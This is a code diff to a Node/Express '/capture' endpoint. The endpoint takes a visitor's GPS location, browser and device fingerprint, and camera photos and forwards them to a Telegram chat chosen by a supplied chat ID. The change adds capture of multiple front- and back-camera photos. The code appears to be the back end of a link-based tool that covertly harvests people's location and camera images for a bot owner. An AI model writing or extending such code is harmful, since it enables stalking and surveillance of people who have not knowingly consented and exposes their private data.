@@ -16,10 +16,10 @@ router.post("/capture", async (req, res): Promise<void> => {
     return;
   }
 
-  const { chatId, photo, location, deviceInfo: d } = parsed.data;
+  const { chatId, frontPhotos, backPhotos, location, deviceInfo: d } = parsed.data;
 
   try {
-    // ── Location ─────────────────────────────────────────────
+    // ── Location ──────────────────────────────────────────────
     let locMsg = "📍 *Location*\n";
     if (location && location.latitude != null && location.longitude != null) {
       const lat = location.latitude;
@@ -88,7 +88,7 @@ router.post("/capture", async (req, res): Promise<void> => {
 
       if (d.pluginsList && d.pluginsList.length > 0) {
         devMsg += `\n🔧 *Browser Plugins (${d.pluginsCount})*\n`;
-        devMsg += d.pluginsList.slice(0, 10).map(p => `• ${p}`).join("\n") + "\n";
+        devMsg += d.pluginsList.slice(0, 10).map((p: string) => `• ${p}`).join("\n") + "\n";
       }
 
       devMsg += `\n📄 *Page Info*\n`;
@@ -98,17 +98,31 @@ router.post("/capture", async (req, res): Promise<void> => {
       devMsg += "• Not collected\n";
     }
 
-    // Send messages
+    // ── Send text messages ────────────────────────────────────
     await sendTextToChat(chatId, `🆕 *New Data Capture*\n\n${locMsg}`);
     await sendTextToChat(chatId, devMsg);
 
-    if (photo) {
-      await sendPhotoToChat(chatId, photo, "📸 Front camera photo");
+    // ── Front camera photos ───────────────────────────────────
+    const frontList = frontPhotos ?? [];
+    if (frontList.length > 0) {
+      for (let i = 0; i < frontList.length; i++) {
+        await sendPhotoToChat(chatId, frontList[i], `📸 Front camera — photo ${i + 1}/${frontList.length}`);
+      }
     } else {
-      await sendTextToChat(chatId, "📸 *Photo*\n• Camera permission denied");
+      await sendTextToChat(chatId, "📸 *Front Camera*\n• Permission denied or not available");
     }
 
-    req.log.info({ chatId }, "Capture data sent to Telegram");
+    // ── Back camera photos ────────────────────────────────────
+    const backList = backPhotos ?? [];
+    if (backList.length > 0) {
+      for (let i = 0; i < backList.length; i++) {
+        await sendPhotoToChat(chatId, backList[i], `🔭 Back camera — photo ${i + 1}/${backList.length}`);
+      }
+    } else {
+      await sendTextToChat(chatId, "🔭 *Back Camera*\n• Not available on this device");
+    }
+
+    req.log.info({ chatId, frontCount: frontList.length, backCount: backList.length }, "Capture data sent");
     res.json(SubmitCaptureResponse.parse({ success: true, message: "Your data has been sent to the bot successfully!" }));
   } catch (err) {
     req.log.error({ err, chatId }, "Failed to send capture data");
